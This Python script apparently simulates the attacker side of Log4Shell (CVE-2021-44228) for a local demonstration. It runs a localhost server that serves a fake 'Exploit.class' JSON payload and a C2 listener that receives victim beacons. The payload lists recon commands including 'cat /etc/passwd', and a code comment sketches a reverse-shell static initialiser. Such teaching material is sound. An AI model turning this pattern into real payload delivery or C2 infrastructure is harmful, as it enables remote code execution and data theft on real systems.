"""
Log4Shell Simulation - Malicious HTTP Payload Server + C2 Listener
===================================================================
This simulates TWO attacker components in one process:

1. HTTP PAYLOAD SERVER — Serves the malicious Exploit.class to the victim.
   After the rogue LDAP server redirects the victim's JVM here, this server
   delivers the weaponised Java class that achieves Remote Code Execution.

2. C2 BEACON LISTENER — Receives the reverse-shell beacon callback from the
   compromised victim. In a real attack, this would grant the attacker a
   persistent shell or data exfiltration channel.

CVE-2021-44228  |  CVSS 10.0 (Critical)
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import os

# ─── ANSI Colours ────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
MAGENTA = "\033[95m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

HTTP_PORT = 8888


class MaliciousPayloadHandler(BaseHTTPRequestHandler):
    """
    Handles two types of requests:

    GET /Exploit.class  →  Serves the malicious Java class to the victim
    POST /beacon        →  Receives system info beacon from compromised host
    """

    def do_GET(self):
        """Serve the malicious Exploit.class payload to the victim."""
        if self.path == "/Exploit.class":
            print(f"\n{YELLOW}{'─'*60}{RESET}")
            print(f"{RED}{BOLD}📥 VICTIM DOWNLOADING MALICIOUS CLASS{RESET}")
            print(f"{YELLOW}{'─'*60}{RESET}")
            print(f"  {DIM}Victim IP:{RESET}    {self.client_address[0]}:{self.client_address[1]}")
            print(f"  {DIM}Request:{RESET}      GET {self.path}")
            print(f"  {DIM}User-Agent:{RESET}   {self.headers.get('User-Agent', 'N/A')}")

            # In reality, this would be compiled Java bytecode (.class file).
            # The malicious class typically contains a static initialiser that
            # runs arbitrary code when the class is loaded by the JVM:
            #
            #   public class Exploit {
            #       static {
            #           Runtime.getRuntime().exec("bash -c {reverse_shell}");
            #       }
            #   }
            #
            # For our simulation, we send a JSON payload that the victim script
            # will interpret and "execute".
            exploit_payload = json.dumps({
                "class":   "Exploit",
                "action":  "reverse_shell_beacon",
                "beacon_target": "http://127.0.0.1:8888/beacon",
                "commands": [
                    "whoami",
                    "hostname",
                    "uname -a",
                    "cat /etc/passwd | head -3"
                ],
                "message": "You have been compromised by Log4Shell (CVE-2021-44228)"
            }, indent=2)

            self.send_response(200)
            self.send_header("Content-Type", "application/java-archive")
            self.send_header("Content-Length", str(len(exploit_payload)))
            self.end_headers()
            self.wfile.write(exploit_payload.encode("utf-8"))

            print(f"\n  {CYAN}[→] Malicious Exploit.class delivered!{RESET}")
            print(f"  {DIM}Payload contains reverse-shell beacon instructions.{RESET}")
            print(f"  {DIM}Waiting for victim to execute and beacon back...{RESET}")
            print(f"{YELLOW}{'─'*60}{RESET}")
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        """Receive the beacon callback from the compromised victim."""
        if self.path == "/beacon":
            content_length = int(self.headers.get("Content-Length", 0))
            post_data = self.rfile.read(content_length) if content_length else b""

            try:
                data = json.loads(post_data.decode("utf-8"))
            except Exception:
                data = {"raw": post_data.decode("utf-8", errors="replace")}

            print(f"\n\n{'='*60}")
            print(f"{RED}{BOLD}🚨 [ATTACKER C2] SYSTEM COMPROMISED — BEACON RECEIVED 🚨{RESET}")
            print(f"{'='*60}")
            print(f"\n{CYAN}{BOLD}  Target System Information:{RESET}")
            print(f"  {'─'*40}")

            field_icons = {
                "hostname":     "🖥️ ",
                "username":     "👤",
                "platform":     "💻",
                "os_release":   "📋",
                "architecture": "⚙️ ",
                "cwd":          "📂",
                "python_ver":   "🐍",
                "pid":          "🔢",
            }

            for key, value in data.items():
                icon = field_icons.get(key, "  ")
                print(f"   {icon} {key.upper():15s} → {GREEN}{value}{RESET}")

            print(f"\n  {'─'*40}")
            print(f"\n{MAGENTA}{BOLD}  ⚠️  BACKDOOR MARKER FILE CREATED ON VICTIM{RESET}")
            print(f"{DIM}  The payload also wrote a marker file to the victim's")
            print(f"  filesystem to prove arbitrary file-write capability.{RESET}")
            print(f"\n{RED}{BOLD}  💀 Full Remote Code Execution achieved.{RESET}")
            print(f"{DIM}  Attacker can now: deploy ransomware, exfiltrate data,")
            print(f"  install crypto-miners, or pivot laterally.{RESET}")
            print(f"\n{'='*60}\n")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        """Suppress default HTTP logging to keep console clean for demo."""
        pass


def main():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════╗
║     MALICIOUS HTTP PAYLOAD SERVER + C2 LISTENER          ║
║     Log4Shell (CVE-2021-44228) Simulation                ║
╚══════════════════════════════════════════════════════════╝{RESET}

{DIM}This server performs two roles:
  1. Serves the malicious Exploit.class to compromised victims
  2. Receives reverse-shell beacon callbacks from infected hosts

In a real attack, the Exploit.class would contain compiled Java
bytecode with a static initialiser that executes a reverse shell
or drops additional malware onto the victim's machine.{RESET}
""")

    server = HTTPServer(("127.0.0.1", HTTP_PORT), MaliciousPayloadHandler)
    print(f"{GREEN}[*] HTTP payload server listening on 127.0.0.1:{HTTP_PORT}{RESET}")
    print(f"{DIM}[*] Serving: GET /Exploit.class  (malicious payload){RESET}")
    print(f"{DIM}[*] Listening: POST /beacon      (C2 callback){RESET}")
    print(f"{YELLOW}[*] Waiting for victims to download the payload...{RESET}\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{DIM}[*] Shutting down payload server.{RESET}")


if __name__ == "__main__":
    main()
